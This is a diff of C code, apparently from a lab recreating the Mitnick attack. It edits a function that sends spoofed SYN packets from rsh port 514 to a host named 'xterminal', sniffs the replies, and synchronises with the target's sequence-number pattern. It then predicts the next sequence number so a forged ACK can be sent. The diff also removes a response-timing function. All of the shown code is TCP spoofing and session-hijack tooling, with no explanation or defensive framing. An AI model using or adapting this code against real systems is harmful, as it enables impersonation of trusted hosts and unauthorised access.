@@ -63,41 +63,34 @@ pcap_t* packetSnifferInitialize()
 
 }
 
-double timeToAnswer(libnet_t *l,u_long kevin, u_long xterminal, u_int32_t sport, u_int32_t dport, pcap_t* des)
-{
-    struct pcap_pkthdr *header;
-    const u_char *packet;
-   
-    int status;
-
-    tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
-    ipTagCreate(l,(u_int32_t)kevin,(u_int32_t)xterminal,NULL,(u_int32_t)0);
-    time_t start = time(NULL);
-    sendPacket(l);
-
-    //Read packet
-    status = pcap_next_ex(des, &header, &packet);
-        
-    //Check the result of the reading
-    return (double)(time(NULL) - start);
-}
-
-
+//Function to generate next seq
 uint32_t getNextSeq(libnet_t *l,u_long kevin, u_long xterminal, u_int32_t sport, u_int32_t dport, pcap_t* des )
 {
     
+
     struct pcap_pkthdr *header;
     const u_char *packet;
-   
     const struct tcphdr* tcp;
+
+    int count=0;
     int status;
     int samepattern=0;
     uint32_t seq[3];
+    //Create tcp/ip layer for the packet
     tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
     ipTagCreate(l,(u_int32_t)kevin,(u_int32_t)xterminal,NULL,(u_int32_t)0);
 
+
+    //This while loop allow to synchronize the program sequence generation
+    //with the one of the xterminal
     while(samepattern==0)
     {   
+        if(count==20)
+        {
+            fprintf(stderr,"Unable to synchronize");
+            exit(1);
+        }
+    
         for(int i=0; i<3;i++)
         {
             sendPacket(l);
@@ -124,7 +117,9 @@ uint32_t getNextSeq(libnet_t *l,u_long kevin, u_long xterminal, u_int32_t sport,
         }
         if((seq[2]-seq[1])==(seq[1]-seq[0]+11111111))
             samepattern=1;
+        count++;
     }
+    //One the synchr is done is possible to generate the seq used to spoof the ack packet
     for(int i=0; i<2;i++)
     {
         //Send SYN packet
@@ -150,9 +145,10 @@ uint32_t getNextSeq(libnet_t *l,u_long kevin, u_long xterminal, u_int32_t sport,
 
     }
     
-    //Generate next seq
+    //Generate next seq using the distance pattern
     uint32_t next=seq[1]+(seq[1]-seq[0])+11111111;
     
+    //Close the packet sniffer
     pcap_close(des);
     return next;
 }
